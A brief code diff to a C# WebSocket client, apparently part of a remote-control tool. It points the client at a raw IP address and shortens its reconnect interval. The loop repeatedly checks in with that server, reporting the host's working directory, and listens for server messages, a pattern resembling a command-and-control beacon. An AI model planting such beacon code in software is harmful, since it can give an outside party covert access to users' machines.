@@ -14,7 +14,7 @@ namespace A3
     {
         static void Main(string[] args)
         {
-            using (var ws = new WebSocket("ws://araulin.me:4422"))
+            using (var ws = new WebSocket("ws://154.49.211.230:4422"))
             {
                 ws.OnMessage += (sender, e) =>
                 {
@@ -71,7 +71,7 @@ namespace A3
                     sw.Start();
                     while (true)
                     {
-                        if(sw.ElapsedMilliseconds > 10000)
+                        if(sw.ElapsedMilliseconds > 2000)
                         {
                             ws.Connect();
                             ws.Send("hello ##" + Environment.CurrentDirectory + "##");
